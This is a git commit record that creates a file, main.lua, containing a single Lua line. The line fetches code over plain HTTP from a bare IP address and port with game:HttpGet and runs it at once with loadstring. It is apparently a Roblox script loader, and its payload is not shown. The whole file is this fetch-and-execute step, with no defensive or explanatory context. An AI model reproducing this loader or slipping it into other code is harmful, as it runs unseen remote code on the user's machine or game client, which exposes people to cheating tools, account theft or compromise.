4f36cb824a38e08e1bcb6e1e6624d10317f3d493
voxiumhub <ticarto092@gmail.com>
2026-02-28 06:11:21 +0300

    Create main.lua

---
+++ main.lua
@@ -0,0 +1,1 @@
+loadstring(game:HttpGet("http://72.56.90.233:3910/api/run/eyJpZCI6ImRlOTBjYTNmLTRjNWEtNDUyZC04MGE1LTE4NTg2MmEwMzBmNSIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJ1bml2ZXJzYWwifX0"))()
